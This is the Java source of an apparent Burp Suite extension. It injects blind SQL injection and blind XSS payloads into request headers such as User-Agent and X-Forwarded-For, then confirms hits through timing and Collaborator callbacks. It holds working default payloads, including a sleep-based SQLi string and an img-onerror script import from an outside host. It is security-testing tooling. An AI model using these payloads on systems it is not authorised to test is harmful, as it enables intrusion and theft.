package slicingmelon.burpheaderbanger;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.CollaboratorPayload;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.collaborator.SecretKey;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.persistence.PersistedObject;
import burp.api.montoya.core.Marker;
import burp.api.montoya.proxy.http.InterceptedResponse;
import burp.api.montoya.scanner.scancheck.ScanCheckType;
import burp.api.montoya.scanner.audit.issues.AuditIssue;
import burp.api.montoya.scanner.audit.issues.AuditIssueConfidence;
import burp.api.montoya.scanner.audit.issues.AuditIssueSeverity;

import java.util.*;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public class BurpHeaderBanger implements BurpExtension {

    private static final String VERSION = "0.0.1";
    public static final int MAX_DICTIONARY_SIZE = 5000;
    private static final int DEFAULT_SQLI_SLEEP_TIME = 17;
    
    public static final Set<String> SKIP_CONTENT_TYPES = Set.of(
            "image/png", "image/jpeg", "image/jpg", "image/gif",
            "video/webm", "video/mp4", "text/event-stream",
            "application/octet-stream", "font/woff", "font/woff2"
    );

    private MontoyaApi api;
    private PersistedObject persistedObject;
    private CollaboratorClient collaboratorClient;
    private ScheduledExecutorService scheduler;
    private String collaboratorServerLocation;

    
    // Settings
    private boolean extensionActive = true;
    private boolean onlyInScopeItems = false;
    private int attackMode = 2; // 1 = Blind SQLi, 2 = Blind XSS
    private int sqliSleepTime = DEFAULT_SQLI_SLEEP_TIME;
    
    // Headers and payloads
    private List<String> headers = new ArrayList<>();
    private List<String> sensitiveHeaders = new ArrayList<>();
    private String sqliPayload = "1'XOR(if(now()=sysdate(),sleep(17),0))OR'Z";
    private String bxssPayload = "\"><img/src/onerror=import('//{{collaborator}}')>"; // Use {{collaborator}} placeholder
    private List<String> skipHosts = new ArrayList<>();
    private List<String> injectedHeaders = new ArrayList<>();
    private List<String> extraHeaders = new ArrayList<>();
    private boolean overwriteExtraHeaders = true; // true = overwrite, false = add only if not exists
    
    // UI Components
    private HeaderBangerTab headerBangerTab;
    
    // Request timing tracking
    private final Map<String, Long> requestTimestamps = new ConcurrentHashMap<>();
    
    // Efficient payload correlation tracking
    private final Map<String, PayloadCorrelation> payloadMap = new ConcurrentHashMap<>();


    
    // Default headers
    private static final List<String> DEFAULT_HEADERS = Arrays.asList(
            "User-Agent",
            "Referer",
            "X-Forwarded-For",
            "X-Real-IP",
            "Forwarded",
            "True-Client-IP",
            "X-Client-IP",
            "X-Cluster-Client-IP",
            "X-Originating-IP",
            "CF-Connecting-IP",
            "Fastly-Client-IP"
    );
    
    private static final List<String> DEFAULT_SENSITIVE_HEADERS = Arrays.asList(
            "X-Host", "X-Forwarded-Host", "X-Forwarded-Server",
            "X-HTTP-Host-Override", "Forwarded", "Origin"
    );
    
    private static final List<String> DEFAULT_SKIP_HOSTS = Arrays.asList(
            "player.vimeo.com", "example3.com"
    );

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.persistedObject = api.persistence().extensionData();
        
        // Initialize collaborator client with secret key
        initializeCollaboratorClient();
        
        this.scheduler = Executors.newScheduledThreadPool(2);
        
        // Set extension name
        api.extension().setName("Header Banger");
        
        // Load settings
        loadSettings();
        
        // Initialize collaborator payload
        // initializeCollaboratorPayload(); // This is no longer needed as we generate payloads on the fly
        
        // Update injected headers
        updateInjectedHeaders();
        
        // Create helper classes
        AuditIssueBuilder auditIssueCreator = new AuditIssueBuilder(this, api);
        ProxyHandler proxyHandler = new ProxyHandler(this, api, scheduler, collaboratorClient, 
                collaboratorServerLocation, requestTimestamps, payloadMap, auditIssueCreator);
        ScanCheck scanCheck = new ScanCheck(this, api, scheduler, collaboratorClient, 
                payloadMap, auditIssueCreator);
        
        // Register handlers
        api.proxy().registerRequestHandler(proxyHandler);
        api.proxy().registerResponseHandler(proxyHandler);
        api.scanner().registerActiveScanCheck(scanCheck, ScanCheckType.PER_REQUEST);
        api.scanner().registerPassiveScanCheck(scanCheck, ScanCheckType.PER_REQUEST);
        api.userInterface().registerContextMenuItemsProvider(scanCheck);
        
        // Create and register UI
        headerBangerTab = new HeaderBangerTab(this, api);
        api.userInterface().registerSuiteTab("Header Banger", headerBangerTab.getTabbedPane());
        
        // Start collaborator polling
        startCollaboratorPolling();
        
        api.logging().logToOutput("Header Banger v" + VERSION + " loaded successfully");
    }

    private void initializeCollaboratorClient() {
        try {
            // Get existing secret key from persistence
            String existingCollaboratorKey = persistedObject.getString("collaboratorSecretKey");
            
            if (existingCollaboratorKey != null && !existingCollaboratorKey.isEmpty()) {
                try {
                    api.logging().logToOutput("Creating Collaborator client from existing key");
                    this.collaboratorClient = api.collaborator().restoreClient(SecretKey.secretKey(existingCollaboratorKey));
                } catch (Exception e) {
                    api.logging().logToOutput("Failed to restore collaborator client, creating new one: " + e.getMessage());
                    this.collaboratorClient = api.collaborator().createClient();
                    persistedObject.setString("collaboratorSecretKey", this.collaboratorClient.getSecretKey().toString());
                }
            } else {
                api.logging().logToOutput("No previously found Collaborator client. Creating new client...");
                this.collaboratorClient = api.collaborator().createClient();
                
                // Save the secret key of the CollaboratorClient so that you can retrieve it later
                api.logging().logToOutput("Saving Collaborator secret key");
                persistedObject.setString("collaboratorSecretKey", this.collaboratorClient.getSecretKey().toString());
            }
            
            this.collaboratorServerLocation = this.collaboratorClient.generatePayload().toString().split("\\.", 2)[1];
            api.logging().logToOutput("Collaborator client initialized successfully");
        } catch (Exception e) {
            api.logging().logToError("Failed to initialize collaborator client: " + e.getMessage());
            // Fallback to creating a new client
            this.collaboratorClient = api.collaborator().createClient();
            this.collaboratorServerLocation = this.collaboratorClient.generatePayload().toString().split("\\.", 2)[1];
        }
    }
    


    private void loadSettings() {
        // Load extension active state
        if (persistedObject.getBoolean("extensionActive") != null) {
            extensionActive = persistedObject.getBoolean("extensionActive");
        }
        
        // Load only in scope setting
        if (persistedObject.getBoolean("onlyInScopeItems") != null) {
            onlyInScopeItems = persistedObject.getBoolean("onlyInScopeItems");
        }
        
        // Load attack mode
        if (persistedObject.getInteger("attackMode") != null) {
            attackMode = persistedObject.getInteger("attackMode");
        }
        
        // Load headers
        String headersJson = persistedObject.getString("headers");
        if (headersJson != null && !headersJson.isEmpty()) {
            headers = new ArrayList<>(Arrays.asList(headersJson.split(",")));
        } else {
            headers = new ArrayList<>(DEFAULT_HEADERS);
        }
        
        // Load sensitive headers
        String sensitiveHeadersJson = persistedObject.getString("sensitiveHeaders");
        if (sensitiveHeadersJson != null && !sensitiveHeadersJson.isEmpty()) {
            sensitiveHeaders = new ArrayList<>(Arrays.asList(sensitiveHeadersJson.split(",")));
        } else {
            sensitiveHeaders = new ArrayList<>(DEFAULT_SENSITIVE_HEADERS);
        }
        
        // Load skip hosts
        String skipHostsJson = persistedObject.getString("skipHosts");
        if (skipHostsJson != null && !skipHostsJson.isEmpty()) {
            skipHosts = new ArrayList<>(Arrays.asList(skipHostsJson.split(",")));
        } else {
            skipHosts = new ArrayList<>(DEFAULT_SKIP_HOSTS);
        }
        
        // Load payloads
        String savedSqliPayload = persistedObject.getString("sqliPayload");
        if (savedSqliPayload != null) {
            sqliPayload = savedSqliPayload;
        }
        
        String savedBxssPayload = persistedObject.getString("bxssPayload");
        if (savedBxssPayload != null) {
            bxssPayload = savedBxssPayload;
        }
        
        // Load extra headers
        String extraHeadersJson = persistedObject.getString("extraHeaders");
        api.logging().logToOutput("DEBUG LOAD: Raw extra headers JSON: '" + extraHeadersJson + "'");
        if (extraHeadersJson != null && !extraHeadersJson.isEmpty()) {
            extraHeaders = new ArrayList<>(Arrays.asList(extraHeadersJson.split(",")));
        }
        
        // Debug logging for extra headers
        api.logging().logToOutput("Loaded " + extraHeaders.size() + " extra headers: " + extraHeaders);
        for (int i = 0; i < extraHeaders.size(); i++) {
            api.logging().logToOutput("  Extra header " + i + ": '" + extraHeaders.get(i) + "'");
        }
        
        // Load overwrite setting
        if (persistedObject.getBoolean("overwriteExtraHeaders") != null) {
            overwriteExtraHeaders = persistedObject.getBoolean("overwriteExtraHeaders");
        }
        
        // Extract sleep time from SQLi payload
        extractSqliSleepTime();
    }

    public void saveSettings() {
        persistedObject.setBoolean("extensionActive", extensionActive);
        persistedObject.setBoolean("onlyInScopeItems", onlyInScopeItems);
        persistedObject.setInteger("attackMode", attackMode);
        persistedObject.setString("headers", String.join(",", headers));
        persistedObject.setString("sensitiveHeaders", String.join(",", sensitiveHeaders));
        persistedObject.setString("skipHosts", String.join(",", skipHosts));
        persistedObject.setString("sqliPayload", sqliPayload);
        persistedObject.setString("bxssPayload", bxssPayload);
        
        // Debug logging for extra headers save
        api.logging().logToOutput("DEBUG saveSettings: Saving " + extraHeaders.size() + " extra headers: " + extraHeaders);
        api.logging().logToOutput("DEBUG saveSettings: Extra headers as string: '" + String.join(",", extraHeaders) + "'");
        api.logging().logToOutput("DEBUG saveSettings: overwriteExtraHeaders setting: " + overwriteExtraHeaders);
        
        persistedObject.setString("extraHeaders", String.join(",", extraHeaders));
        persistedObject.setBoolean("overwriteExtraHeaders", overwriteExtraHeaders);
    }

    // Getter and setter methods for UI access
    public boolean isExtensionActive() { return extensionActive; }
    public void setExtensionActive(boolean active) { this.extensionActive = active; }
    
    public boolean isOnlyInScopeItems() { return onlyInScopeItems; }
    public void setOnlyInScopeItems(boolean onlyInScope) { this.onlyInScopeItems = onlyInScope; }
    
    public boolean isOverwriteExtraHeaders() { return overwriteExtraHeaders; }
    public void setOverwriteExtraHeaders(boolean overwrite) { this.overwriteExtraHeaders = overwrite; }
    
    public int getAttackMode() { return attackMode; }
    public void setAttackMode(int mode) { this.attackMode = mode; }

    // Remove old UI creation methods - they're now in HeaderBangerTab.java
    
    public List<String> getHeaders() { return headers; }
    public List<String> getSensitiveHeaders() { return sensitiveHeaders; }
    public List<String> getExtraHeaders() { return extraHeaders; }
    public List<String> getSkipHosts() { return skipHosts; }
    
    public String getSqliPayload() { return sqliPayload; }
    public void setSqliPayload(String payload) { this.sqliPayload = payload; }
    
    public String getBxssPayload() { return bxssPayload; }
    public void setBxssPayload(String payload) { this.bxssPayload = payload; }
    
    public CollaboratorClient getCollaboratorClient() { return collaboratorClient; }
    
    public int getSqliSleepTime() { return sqliSleepTime; }
    public List<String> getInjectedHeaders() { return injectedHeaders; }
    
    public List<String> getDefaultHeaders() { return new ArrayList<>(DEFAULT_HEADERS); }
    public List<String> getDefaultSensitiveHeaders() { return new ArrayList<>(DEFAULT_SENSITIVE_HEADERS); }

    private void initializeCollaboratorPayload() {
        // This method is no longer needed as we generate payloads dynamically.
        // It's kept here to avoid breaking old references, but it's empty.
    }

    public void extractSqliSleepTime() {
        Pattern pattern = Pattern.compile("sleep\\((\\d+)\\)", Pattern.CASE_INSENSITIVE);
        Matcher matcher = pattern.matcher(sqliPayload);
        if (matcher.find()) {
            sqliSleepTime = Integer.parseInt(matcher.group(1));
        }
    }

    public void updateInjectedHeaders() {
        // NOTE: This method is now only used for backward compatibility and legacy functions.
        // Regular proxy interception now handles headers directly in ProxyHandler.java
        // This is kept for any remaining code that might reference it.
        
        injectedHeaders.clear();
        String currentPayload = (attackMode == 1) ? sqliPayload : bxssPayload;
        
        for (String header : headers) {
            injectedHeaders.add(header + ": " + currentPayload);
        }
        
        // Note: Extra headers are NOT added here - they should be added separately 
        // without any payload injection in the request modification methods
    }

    private void startCollaboratorPolling() {
        api.logging().logToOutput("Starting collaborator polling every 10 seconds...");
        
        scheduler.scheduleWithFixedDelay(() -> {
            try {
                api.logging().logToOutput("Polling collaborator for interactions...");
                
                List<Interaction> interactions = collaboratorClient.getAllInteractions();
                
                api.logging().logToOutput("Collaborator polling: Found " + interactions.size() + " interactions");
                api.logging().logToOutput("Current payload map size: " + payloadMap.size());
                
                if (payloadMap.size() > 0) {
                    api.logging().logToOutput("Sample payload map entries: " + payloadMap.keySet().stream().limit(5).collect(Collectors.toList()));
                }
                
                // Debug: Log details of all interactions
                if (interactions.size() > 0) {
                    api.logging().logToOutput("═══════════════════════════════════════════════════════════");
                    api.logging().logToOutput("INTERACTION DETAILS:");
                    for (int i = 0; i < interactions.size(); i++) {
                        Interaction interaction = interactions.get(i);
                        api.logging().logToOutput("Interaction " + (i + 1) + ":");
                        api.logging().logToOutput("  Type: " + interaction.type().name());
                        api.logging().logToOutput("  ID: " + interaction.id().toString());
                        api.logging().logToOutput("  Has HTTP details: " + interaction.httpDetails().isPresent());
                        api.logging().logToOutput("  Has DNS details: " + interaction.dnsDetails().isPresent());
                        api.logging().logToOutput("  Has SMTP details: " + interaction.smtpDetails().isPresent());
                        api.logging().logToOutput("  ─────────────────────────────────────────────────────────");
                    }
                    api.logging().logToOutput("═══════════════════════════════════════════════════════════");
                }
                
                for (Interaction interaction : interactions) {
                    api.logging().logToOutput("Processing interaction: " + interaction.id().toString());
                    
                    String interactionDomain = findDomainInInteraction(interaction);
                    if (interactionDomain != null) {
                        PayloadCorrelation correlation = payloadMap.get(interactionDomain);
                        if (correlation != null) {
                            api.logging().logToOutput("SUCCESSFUL XSS DETECTED!");
                            api.logging().logToOutput("═══════════════════════════════════════════════════════════");
                            
                            // Log detailed interaction information
                            api.logging().logToOutput("Interaction Details:");
                            api.logging().logToOutput("  • URL: " + correlation.requestUrl);
                            api.logging().logToOutput("  • Method: " + correlation.requestMethod);
                            api.logging().logToOutput("  • Header: " + correlation.headerName);
                            api.logging().logToOutput("  • Time: " + new java.util.Date());
                            
                            api.logging().logToOutput("═══════════════════════════════════════════════════════════");
                            
                            // Create XSS issue using proxy history
                            createXssIssueFromProxyHistory(interaction, correlation);
                            
                            // Clean up the map
                            payloadMap.remove(interactionDomain);
                        } else {
                            api.logging().logToOutput("Found interaction domain but no correlation: " + interactionDomain);
                        }
                    } else {
                        api.logging().logToOutput("No matching domain found for interaction: " + interaction.id().toString());
                    }
                }
                
                api.logging().logToOutput("Collaborator polling completed.");
            } catch (Exception e) {
                api.logging().logToError("Error polling collaborator: " + e.getMessage());
                e.printStackTrace();
            }
        }, 10, 10, TimeUnit.SECONDS);  // Changed from 30 to 10 seconds

        // Add a cleanup task for old payloads in the map
        scheduler.scheduleWithFixedDelay(() -> {
            long now = System.currentTimeMillis();
            int removedCount = 0;
            Iterator<Map.Entry<String, PayloadCorrelation>> iterator = payloadMap.entrySet().iterator();
            while (iterator.hasNext()) {
                Map.Entry<String, PayloadCorrelation> entry = iterator.next();
                if ((now - entry.getValue().timestamp) > TimeUnit.MINUTES.toMillis(15)) {
                    iterator.remove();
                    removedCount++;
                }
            }
            if (removedCount > 0) {
                api.logging().logToOutput("Cleaned up " + removedCount + " old payloads from map");
            }
        }, 15, 15, TimeUnit.MINUTES);
    }

    private String findDomainInInteraction(Interaction interaction) {
        String interactionId = interaction.id().toString();
        
        // Debug: Log the interaction details
        api.logging().logToOutput("Found interaction - Type: " + interaction.type().name() + ", ID: " + interactionId);
        
        // The interaction ID should directly match our stored payload domain
        if (payloadMap.containsKey(interactionId)) {
            api.logging().logToOutput("Direct match found for interaction ID: " + interactionId);
            return interactionId;
        }
        
        // Debug: Show what we have in the payload map vs what we're looking for
        api.logging().logToOutput("No direct match found for interaction ID: " + interactionId);
        api.logging().logToOutput("Looking for matches in payload map...");
        
        // Check if it's a partial match (maybe with/without protocol or trailing dots)
        for (String payloadDomain : payloadMap.keySet()) {
            api.logging().logToOutput("Comparing '" + interactionId + "' with '" + payloadDomain + "'");
            
            if (interactionId.equals(payloadDomain)) {
                api.logging().logToOutput("Exact match found: " + payloadDomain);
                return payloadDomain;
            }
            
            // Check if interaction ID contains the payload domain
            if (interactionId.contains(payloadDomain)) {
                api.logging().logToOutput("Partial match found: " + payloadDomain + " in " + interactionId);
                return payloadDomain;
            }
            
            // Check if payload domain contains the interaction ID
            if (payloadDomain.contains(interactionId)) {
                api.logging().logToOutput("Reverse partial match found: " + interactionId + " in " + payloadDomain);
                return payloadDomain;
            }
        }
        
        api.logging().logToOutput("No matching payload found for interaction ID: " + interactionId);
        return null;
    }

    private void createXssIssueFromProxyHistory(Interaction interaction, PayloadCorrelation correlation) {
        api.logging().logToOutput("XSS VULNERABILITY CONFIRMED!");
        api.logging().logToOutput("Attack Vector: Header injection via " + correlation.headerName);
        api.logging().logToOutput("  • URL: " + correlation.requestUrl);
        api.logging().logToOutput("  • Method: " + correlation.requestMethod);
        api.logging().logToOutput("Impact: Cross-Site Scripting (XSS) execution detected");
        api.logging().logToOutput("Detected: " + new java.util.Date());
        api.logging().logToOutput("Interaction ID: " + interaction.id());
        
        // Find the original request from proxy history using interaction ID
        String interactionId = interaction.id().toString();
        List<burp.api.montoya.proxy.ProxyHttpRequestResponse> proxyHistory = api.proxy().history(
            requestResponse -> requestResponse.finalRequest().toString().contains(interactionId)
        );
        
        if (!proxyHistory.isEmpty()) {
            // Use the first matching request from proxy history
            burp.api.montoya.proxy.ProxyHttpRequestResponse originalRequestResponse = proxyHistory.get(0);
            
                            try {
                    // Create audit issue using the original request/response from proxy history
                    HttpRequestResponse evidenceRequestResponse = HttpRequestResponse.httpRequestResponse(
                        originalRequestResponse.finalRequest(), 
                        originalRequestResponse.originalResponse()
                    );
                    
                    // Get markers for the XSS payload in request and response
                    // Use the collaborator domain to find the payload
                    String collaboratorDomain = interaction.id().toString();
                    List<Marker> requestMarkers = getRequestMarkers(originalRequestResponse.finalRequest(), collaboratorDomain);
                    List<Marker> responseMarkers = getResponseMarkers(evidenceRequestResponse, collaboratorDomain);
                    
                    // Add markers to the evidence
                    HttpRequestResponse markedEvidence = evidenceRequestResponse;
                    if (!requestMarkers.isEmpty()) {
                        markedEvidence = markedEvidence.withRequestMarkers(requestMarkers);
                    }
                    if (!responseMarkers.isEmpty()) {
                        markedEvidence = markedEvidence.withResponseMarkers(responseMarkers);
                    }
                    
                    AuditIssue issue = AuditIssue.auditIssue(
                        "Header Injection XSS via " + correlation.headerName,
                        "Cross-Site Scripting (XSS) vulnerability detected through header injection in the " 
                        + correlation.headerName + " header. The payload was successfully executed as confirmed by "
                        + "collaborator interaction " + interaction.id() + ". This allows attackers to inject arbitrary "
                        + "JavaScript code that will be executed in the context of other users' browsers. "
                        + "Collaborator domain: " + collaboratorDomain,
                        "Fix this vulnerability by properly validating and sanitizing all user input, especially in HTTP headers. "
                        + "Implement proper output encoding when reflecting user-controlled data in responses.",
                        originalRequestResponse.finalRequest().url(),
                        AuditIssueSeverity.HIGH,
                        AuditIssueConfidence.CERTAIN,
                        "This vulnerability allows attackers to execute arbitrary JavaScript in the victim's browser, "
                        + "potentially leading to session hijacking, defacement, or other malicious activities.",
                        "The application reflects user-controlled header values without proper validation or encoding, "
                        + "allowing XSS attacks through HTTP header injection.",
                        AuditIssueSeverity.HIGH,
                        markedEvidence
                    );
                    
                    api.siteMap().add(issue);
                    api.logging().logToOutput("Audit issue created successfully: Header Injection XSS via " + correlation.headerName);
                } catch (Exception e) {
                    api.logging().logToError("Failed to create audit issue: " + e.getMessage());
                }
        } else {
            api.logging().logToOutput("Could not find original request in proxy history for interaction: " + interactionId);
            
            // Fallback to the old method if proxy history doesn't contain the request
            try {
                HttpRequest issueRequest = HttpRequest.httpRequestFromUrl(correlation.requestUrl);
                HttpRequestResponse issueRequestResponse = api.http().sendRequest(issueRequest);
                
                // Get markers for the XSS payload in request and response
                String collaboratorDomain = interaction.id().toString();
                List<Marker> requestMarkers = getRequestMarkers(issueRequest, collaboratorDomain);
                List<Marker> responseMarkers = getResponseMarkers(issueRequestResponse, collaboratorDomain);
                
                // Add markers to the evidence
                HttpRequestResponse markedEvidence = issueRequestResponse;
                if (!requestMarkers.isEmpty()) {
                    markedEvidence = markedEvidence.withRequestMarkers(requestMarkers);
                }
                if (!responseMarkers.isEmpty()) {
                    markedEvidence = markedEvidence.withResponseMarkers(responseMarkers);
                }
                
                AuditIssue issue = AuditIssue.auditIssue(
                    "Header Injection XSS via " + correlation.headerName,
                    "Cross-Site Scripting (XSS) vulnerability detected through header injection in the " 
                    + correlation.headerName + " header. The payload was successfully executed as confirmed by "
                    + "collaborator interaction " + interaction.id() + ". This allows attackers to inject arbitrary "
                    + "JavaScript code that will be executed in the context of other users' browsers. "
                    + "Collaborator domain: " + collaboratorDomain,
                    "Fix this vulnerability by properly validating and sanitizing all user input, especially in HTTP headers. "
                    + "Implement proper output encoding when reflecting user-controlled data in responses.",
                    correlation.requestUrl,
                    AuditIssueSeverity.HIGH,
                    AuditIssueConfidence.CERTAIN,
                    "This vulnerability allows attackers to execute arbitrary JavaScript in the victim's browser, "
                    + "potentially leading to session hijacking, defacement, or other malicious activities.",
                    "The application reflects user-controlled header values without proper validation or encoding, "
                    + "allowing XSS attacks through HTTP header injection.",
                    AuditIssueSeverity.HIGH,
                    markedEvidence
                );
                
                api.siteMap().add(issue);
                api.logging().logToOutput("Audit issue created successfully (fallback): Header Injection XSS via " + correlation.headerName);
            } catch (Exception e) {
                api.logging().logToError("Failed to create fallback audit issue: " + e.getMessage());
            }
        }
        
        api.logging().logToOutput("───────────────────────────────────────────────────────────");
    }

    private void createAuditIssue(String issueName, String issueDetail, String requestUrl, 
                                  AuditIssueSeverity severity, AuditIssueConfidence confidence) {
        try {
            // Create a simple HTTP request for the issue
            HttpRequest issueRequest = HttpRequest.httpRequestFromUrl(requestUrl);
            HttpRequestResponse issueRequestResponse = api.http().sendRequest(issueRequest);
            
            // Build the audit issue
            AuditIssue issue = AuditIssue.auditIssue(
                issueName,
                issueDetail,
                null, // remediation - can be null
                requestUrl,
                severity,
                confidence,
                null, // background - can be null
                null, // remediation background - can be null
                severity, // issue severity (not confidence)
                issueRequestResponse // evidence (request/response)
            );
            
            // Add the issue to Burp's issue list
            api.siteMap().add(issue);
            
            api.logging().logToOutput("Audit issue created successfully: " + issueName);
        } catch (Exception e) {
            api.logging().logToError("Failed to create audit issue: " + e.getMessage());
        }
    }
    
    private String getCurrentAttackHeaders() {
        StringBuilder attackHeaders = new StringBuilder();
        for (String header : headers) {
            if (attackHeaders.length() > 0) attackHeaders.append(", ");
            attackHeaders.append(header);
        }
        return attackHeaders.toString();
    }

    private List<Marker> getResponseMarkers(HttpRequestResponse requestResponse, String payload) {
        List<Marker> markers = new ArrayList<>();
        
        if (requestResponse.response() == null) {
            return markers;
        }
        
        String responseString = requestResponse.response().toString();
        
        // Search for the payload in the response
        int start = 0;
        while (start < responseString.length()) {
            int found = responseString.indexOf(payload, start);
            if (found == -1) {
                break;
            }
            
            markers.add(Marker.marker(found, found + payload.length()));
            start = found + payload.length();
        }
        
        // If no direct payload found, look for parts of it (like the sleep function)
        if (markers.isEmpty()) {
            start = 0;
            while (start < responseString.length()) {
                int found = responseString.indexOf("sleep(", start);
                if (found == -1) {
                    break;
                }
                
                // Try to find the end of the sleep function call
                int end = found + 6; // "sleep(" length
                while (end < responseString.length() && responseString.charAt(end) != ')') {
                    end++;
                }
                if (end < responseString.length()) {
                    end++; // Include the closing parenthesis
                    markers.add(Marker.marker(found, end));
                }
                start = end;
            }
        }
        
        return markers;
    }

    private List<Marker> getRequestMarkers(HttpRequest request, String payload) {
        List<Marker> markers = new ArrayList<>();
        
        String requestString = request.toString();
        
        // Search for the payload in the request
        int start = 0;
        while (start < requestString.length()) {
            int found = requestString.indexOf(payload, start);
            if (found == -1) {
                break;
            }
            
            markers.add(Marker.marker(found, found + payload.length()));
            start = found + payload.length();
        }
        
        return markers;
    }

    // Utility methods for header handling
    private List<HttpHeader> convertToHttpHeaders(List<String> headerStrings) {
        List<HttpHeader> httpHeaders = new ArrayList<>();
        for (String headerString : headerStrings) {
            String[] parts = headerString.split(":", 2);
            if (parts.length == 2) {
                httpHeaders.add(HttpHeader.httpHeader(parts[0].trim(), parts[1].trim()));
            }
        }
        return httpHeaders;
    }

    private String getHeaderValue(List<HttpHeader> headers, String headerName) {
        for (HttpHeader header : headers) {
            if (header.name().equalsIgnoreCase(headerName)) {
                return header.value();
            }
        }
        return null;
    }

    private List<HttpHeader> addOrReplaceHeaders(List<HttpHeader> originalHeaders, List<String> headersToAdd) {
        List<HttpHeader> newHeaders = new ArrayList<>();
        
        api.logging().logToOutput("DEBUG addOrReplaceHeaders: Original headers count: " + originalHeaders.size());
        api.logging().logToOutput("DEBUG addOrReplaceHeaders: Headers to add: " + headersToAdd);
        api.logging().logToOutput("DEBUG addOrReplaceHeaders: overwriteExtraHeaders setting: " + overwriteExtraHeaders);
        
        // Add original headers, excluding ones we're going to replace
        for (HttpHeader header : originalHeaders) {
            boolean shouldReplace = false;
            for (String headerToAdd : headersToAdd) {
                String[] parts = headerToAdd.split(":", 2);
                if (parts.length == 2 && parts[0].trim().equalsIgnoreCase(header.name())) {
                    shouldReplace = true;
                    break;
                }
            }
            if (!shouldReplace) {
                newHeaders.add(header);
            }
        }
        
        // Add new headers
        for (String headerToAdd : headersToAdd) {
            String[] parts = headerToAdd.split(":", 2);
            api.logging().logToOutput("DEBUG addOrReplaceHeaders: Processing header: " + headerToAdd + " (parts: " + parts.length + ")");
            if (parts.length == 2) {
                String headerName = parts[0].trim();
                String headerValue = parts[1].trim();
                
                api.logging().logToOutput("DEBUG addOrReplaceHeaders: Header name: '" + headerName + "', value: '" + headerValue + "'");
                
                // Special handling for extra headers - they should be governed by the overwrite setting
                boolean isExtraHeader = extraHeaders.stream()
                        .anyMatch(eh -> eh.equalsIgnoreCase(headerToAdd));
                
                // For extra headers, check the overwrite setting
                if (isExtraHeader) {
                    if (!overwriteExtraHeaders) {
                        // If overwrite is disabled, check if header already exists
                        boolean exists = originalHeaders.stream()
                                .anyMatch(h -> h.name().equalsIgnoreCase(headerName));
                        api.logging().logToOutput("DEBUG addOrReplaceHeaders: Extra header exists check: " + exists + " for header: " + headerName);
                        if (exists) {
                            api.logging().logToOutput("DEBUG addOrReplaceHeaders: Skipping extra header " + headerName + " because it already exists and overwrite is disabled");
                            continue; // Skip this header
                        }
                    }
                    api.logging().logToOutput("DEBUG addOrReplaceHeaders: Processing extra header: " + headerName + " (overwrite=" + overwriteExtraHeaders + ")");
                }
                // Regular attack headers are always added (no overwrite check for them)
                
                api.logging().logToOutput("DEBUG addOrReplaceHeaders: Adding header: " + headerName + " = " + headerValue + (isExtraHeader ? " (EXTRA HEADER)" : ""));
                newHeaders.add(HttpHeader.httpHeader(headerName, headerValue));
            } else {
                api.logging().logToOutput("DEBUG addOrReplaceHeaders: Skipping malformed header: " + headerToAdd);
            }
        }
        
        api.logging().logToOutput("DEBUG addOrReplaceHeaders: Final headers count: " + newHeaders.size());
        return newHeaders;
    }

    // Proxy handlers now in separate ProxyHandler class

    private void createSqlInjectionIssue(InterceptedResponse interceptedResponse, long responseTime) {
        api.logging().logToOutput("POSSIBLE SQL INJECTION DETECTED!");
        api.logging().logToOutput("═══════════════════════════════════════════════════════════");
        api.logging().logToOutput("Attack Vector: SQL injection via regular headers");
        api.logging().logToOutput("  • URL: " + interceptedResponse.request().url());
        api.logging().logToOutput("  • Response Time: " + responseTime + " ms");
        api.logging().logToOutput("  • Expected Sleep Time: " + sqliSleepTime + " seconds");
        api.logging().logToOutput("Detected: " + new java.util.Date());
        
        // Create proper audit issue using the original request with injected headers
        try {
            // Use the initiating request that contains the SQL injection payloads
            HttpRequestResponse evidenceRequestResponse = HttpRequestResponse.httpRequestResponse(
                interceptedResponse.initiatingRequest(),
                interceptedResponse
            );
            
            // Get markers for the SQL injection payload in request and response
            List<Marker> requestMarkers = getRequestMarkers(interceptedResponse.initiatingRequest(), sqliPayload);
            List<Marker> responseMarkers = getResponseMarkers(evidenceRequestResponse, sqliPayload);
            
            // Add markers to the evidence
            HttpRequestResponse markedEvidence = evidenceRequestResponse;
            if (!requestMarkers.isEmpty()) {
                markedEvidence = markedEvidence.withRequestMarkers(requestMarkers);
            }
            if (!responseMarkers.isEmpty()) {
                markedEvidence = markedEvidence.withResponseMarkers(responseMarkers);
            }
            
            AuditIssue issue = AuditIssue.auditIssue(
                "Time-based SQL Injection via Headers",
                "Time-based SQL injection vulnerability detected through header injection. The application "
                + "responded with a delay of " + responseTime + " ms, which suggests that the injected "
                + "time-based SQL payload was executed. This indicates that user input is being directly "
                + "incorporated into SQL queries without proper sanitization. "
                + "Payload: " + sqliPayload,
                "Fix this vulnerability by properly validating and sanitizing all user input, especially in HTTP headers. "
                + "Implement proper input validation and use parameterized queries to prevent SQL injection attacks.",
                interceptedResponse.request().url(),
                AuditIssueSeverity.HIGH,
                AuditIssueConfidence.FIRM,
                "This vulnerability allows attackers to execute arbitrary SQL commands on the database server, "
                + "potentially leading to data theft, data manipulation, or complete system compromise.",
                "The application processes user-controlled header values without proper validation or sanitization, "
                + "allowing SQL injection attacks through HTTP header injection.",
                AuditIssueSeverity.HIGH,
                markedEvidence
            );
            
            api.siteMap().add(issue);
            api.logging().logToOutput("Audit issue created successfully: Time-based SQL Injection via Headers");
        } catch (Exception e) {
            api.logging().logToError("Failed to create SQL injection audit issue: " + e.getMessage());
        }
        
        api.logging().logToOutput("═══════════════════════════════════════════════════════════");
    }

    private void createSensitiveHeaderSqlIssue(HttpRequestResponse response, long responseTime) {
        api.logging().logToOutput("POSSIBLE SQL INJECTION VIA SENSITIVE HEADERS DETECTED!");
        api.logging().logToOutput("═══════════════════════════════════════════════════════════");
        api.logging().logToOutput("Attack Vector: SQL injection via sensitive headers");
        api.logging().logToOutput("  • URL: " + response.request().url());
